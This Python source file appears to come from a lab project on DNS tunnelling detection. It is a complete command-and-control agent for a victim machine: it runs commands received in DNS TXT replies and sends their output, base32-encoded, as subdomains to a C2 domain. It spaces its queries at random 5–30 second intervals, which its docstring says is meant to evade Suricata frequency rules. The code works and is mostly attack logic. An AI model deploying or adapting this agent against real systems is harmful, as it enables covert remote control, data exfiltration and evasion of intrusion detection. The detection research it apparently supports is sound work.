#!/usr/bin/env python3
"""
C2 Agent — Scenario 2: Low-and-Slow Communication
Runs on victim. Sends command output to C2 server via DNS.
Receives next command via DNS TXT reply.
 
KEY EVASION TECHNIQUE:
  Randomised wait between 5-30 seconds per query.
  This means 2-12 queries per minute (vs 170/min for iodine).
  Suricata frequency rules (>10 per min) will MISS this.
 
HOW IT WORKS:
  1. Run current command on victim (e.g. hostname)
  2. Encode output in base32 (DNS-safe characters)
  3. Send as subdomain: ENCODED.c2.lab (TXT query)
  4. Receive reply TXT record with next command (also base32)
  5. Decode reply to get next command
  6. Wait random 5-30 seconds (EVASION)
  7. Repeat from step 1
 
Author: Ketan Vala — DNS Project
"""
import base64
import time
import random
import subprocess
import logging
import dns.resolver
 
C2_DOMAIN  = "c2.lab"
DNS_SERVER = "192.168.100.2"    # Gateway IP — routes through IDS
MIN_WAIT   = 5                   # minimum seconds between queries
MAX_WAIT   = 30                  # maximum seconds between queries
MAX_CHUNK  = 50                  # max chars per DNS subdomain label
LOG_FILE   = "/home/ketan/c2_agent.log"
 
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [AGENT] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
log = logging.getLogger()
 
def encode(data):
    """Encode data to base32 for DNS subdomain."""
    return base64.b32encode(data.encode()).decode().rstrip("=").lower()
 
def decode(encoded):
    """Decode base32 from DNS TXT reply."""
    try:
        padding = (8 - len(encoded) % 8) % 8
        padded = encoded.upper() + "=" * padding
        return base64.b32decode(padded).decode(errors="ignore").strip()
    except Exception:
        return ""
 
def send_query(subdomain):
    """
    Send DNS TXT query with encoded data as subdomain.
    Query goes: Victim → Gateway (192.168.100.2) → Attacker
    Returns decoded command from TXT reply.
    """
    full_query = f"{subdomain}.{C2_DOMAIN}"
 
    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [DNS_SERVER]
    resolver.timeout  = 10
    resolver.lifetime = 10
 
    try:
        answer = resolver.resolve(full_query, "TXT")
        for rdata in answer:
            encoded_reply = str(rdata).strip('"')
            decoded = decode(encoded_reply)
            if decoded:
                return decoded
    except dns.resolver.NXDOMAIN:
        log.warning("NXDOMAIN — server not reachable for this domain")
    except dns.resolver.NoAnswer:
        log.warning("No TXT answer received")
    except dns.resolver.Timeout:
        log.warning("DNS query timed out")
    except Exception as e:
        log.warning(f"Query error: {type(e).__name__}: {e}")
    return ""
 
def run_cmd(cmd):
    """Execute system command and return output."""
    try:
        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True, timeout=10
        )
        out = result.stdout.strip() or result.stderr.strip()
        return out[:150] if out else "no_output"
    except subprocess.TimeoutExpired:
        return "cmd_timeout"
    except Exception as e:
        return f"error:{str(e)[:50]}"
 
def main():
    log.info("=" * 55)
    log.info("C2 AGENT — SCENARIO 2 (Low-and-Slow)")
    log.info(f"  C2 Domain:   {C2_DOMAIN}")
    log.info(f"  DNS Server:  {DNS_SERVER} (Gateway)")
    log.info(f"  Wait range:  {MIN_WAIT}-{MAX_WAIT} seconds (random)")
    log.info(f"  Max chunk:   {MAX_CHUNK} chars per query")
    log.info("=" * 55)
 
    query_count = 0
    current_cmd = "hostname"
 
    while True:
        query_count += 1
        log.info(f"--- Query #{query_count} ---")
 
        # Step 1: Execute current command
        output = run_cmd(current_cmd)
        log.info(f"  Executed: '{current_cmd}'")
        log.info(f"  Output:   '{output}'")
 
        # Step 2: Encode output
        encoded = encode(output)
        log.info(f"  Encoded:  '{encoded}' ({len(encoded)} chars)")
 
        # Step 3: Take first chunk (max 50 chars for DNS label safety)
        chunk = encoded[:MAX_CHUNK]
        log.info(f"  Sending:  '{chunk}.{C2_DOMAIN}'")
 
        # Step 4: Send query, receive command
        received = send_query(chunk)
 
        if received:
            log.info(f"  Received: '{received}'")
            current_cmd = received
        else:
            log.info(f"  No reply — keeping current command")
 
        # Step 5: Wait random interval (THE KEY EVASION)
        wait = random.uniform(MIN_WAIT, MAX_WAIT)
        log.info(f"  Waiting:  {wait:.1f} seconds...")
        time.sleep(wait)
 
if __name__ == "__main__":
    main()
